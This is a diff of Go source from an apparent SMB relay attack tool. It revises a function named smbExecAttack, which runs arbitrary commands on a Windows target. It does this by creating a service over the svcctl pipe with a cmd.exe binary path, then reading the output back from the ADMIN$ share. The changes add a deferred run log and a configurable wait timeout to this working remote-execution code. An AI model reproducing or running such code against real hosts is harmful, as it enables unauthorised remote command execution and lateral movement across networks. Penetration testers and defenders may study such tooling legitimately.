@@ -310,12 +310,16 @@ func readNDRString(r *bytes.Reader) string {
 }
 
 // smbExecAttack executes a command on the target via service creation
-func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
+func smbExecAttack(client *SMBRelayClient, cfg *Config) (err error) {
 	if cfg.Command == "" {
 		return fmt.Errorf("no command specified (-c flag)")
 	}
 
-	log.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)
+	// Buffered run log, flushed on every exit (success or failure) so failed
+	// attempts also leave a traceable `smbexec_<host>.txt` for manual review.
+	host := hostFromAddr(client.TargetAddr)
+	rl := &runLog{}
+	defer func() { rl.Flush(cfg, host, "smbexec", cfg.Command, err) }()
 
 	// Connect to IPC$ and open svcctl pipe
 	if err := client.TreeConnect("IPC$"); err != nil {
@@ -356,7 +360,6 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 	outFile := randomName() + ".tmp"
 	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
 
-	rl := &runLog{}
 	rl.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)
 
 	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s > %%SystemRoot%%\\%s 2>&1 & echo %s >> %%SystemRoot%%\\%s",
@@ -387,9 +390,14 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	// Poll for the output file until the completion marker appears (the file is
 	// created at command start, so existence alone does not mean it finished).
+	wait := cfg.CmdTimeout
+	if wait <= 0 {
+		wait = 10 * time.Second
+	}
+	deadline := time.Now().Add(wait)
 	var output []byte
 	found := false
-	for i := 0; i < 20; i++ {
+	for time.Now().Before(deadline) {
 		time.Sleep(500 * time.Millisecond)
 		data, derr := client.DownloadFile("ADMIN$", remoteOut)
 		if derr != nil {
@@ -447,7 +455,6 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 	} else {
 		rl.Printf("[*] Command executed (no output)")
 	}
-	rl.Flush(cfg, hostFromAddr(client.TargetAddr), "smbexec", cfg.Command)
 
 	return nil
 }
